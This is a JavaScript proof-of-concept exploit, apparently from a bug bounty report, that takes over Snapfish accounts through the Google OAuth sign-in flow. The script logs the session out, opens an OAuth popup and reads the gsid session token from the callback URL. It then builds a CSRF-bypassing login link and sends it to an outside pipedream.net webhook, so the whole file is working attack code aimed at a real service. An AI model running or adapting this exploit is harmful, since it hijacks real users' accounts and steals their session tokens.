document.body.innerHTML = '<html><body><center><h1>Processing...</h1></center></body></html>';

// Logout current session (attacker)
fetch('https://www.snapfish.com/logout', {
    method: 'GET',
    credentials: 'include'
}).then(function() {
    
   // OAuth URL that triggers the victim’s automatic login via Google
    var oauthUrl = 'https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=317425865357719&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL';
    
    var popup = window.open(oauthUrl, 'oauth', 'width=600,height=700');
    
    if (!popup) {
        alert('Error: Popup blocked. Please allow popups and try again.');
        return;
    }
    
    // Monitor popup for callback URL
    var checkPopup = setInterval(function() {
        try {
            if (popup.closed) {
                clearInterval(checkPopup);
                return;
            }
            
            try {
                var popupUrl = popup.location.href;
                
                // Intercept callback URL containing direct login link
                if (popupUrl.includes('/webredirect?gsid=')) {
                    clearInterval(checkPopup);
                    
                    // Stop page load to prevent completion
                    try {
                        popup.stop();
                    } catch(e) {}
                    
                    popup.close();
                    
                    // Extract session parameters
                    var url = new URL(popupUrl);
                    var gsidEncoded = popupUrl.split('gsid=')[1].split('&')[0];
                    var userId = url.searchParams.get('user_id');
                    
                    // Construct clean login URL (bypass CSRF by using o=connect)
                    var loginUrl = 'https://www.snapfish.com/webredirect?gsid=' + gsidEncoded + '&o=connect&user_id=' + userId;
                    
                    // Exfiltrate to attacker server
                    fetch('https://eo1ey5201bcmppg.m.pipedream.net?url=' + loginUrl, {
                        method: 'GET',
                        mode: 'no-cors'
                    });
                    
                    // Display captured URL
                    alert('Account Takeover Successful!\n\nVictim Login URL:\n\n' + loginUrl + '\n\nPaste this URL in browser to access victim account.\n\nThe victim session tokens have also been sent to @m4rc10sz webhook.');
                }
            } catch(e) {}
            
        } catch(e) {}
    }, 500);
    
    // Timeout after 30 seconds
    setTimeout(function() {
        if (!popup.closed) {
            clearInterval(checkPopup);
            popup.close();
            alert('Error: OAuth did not complete within 30 seconds.');
        }
    }, 30000);
    
}).catch(function(error) {
    alert('Error during logout: ' + error.message);
});
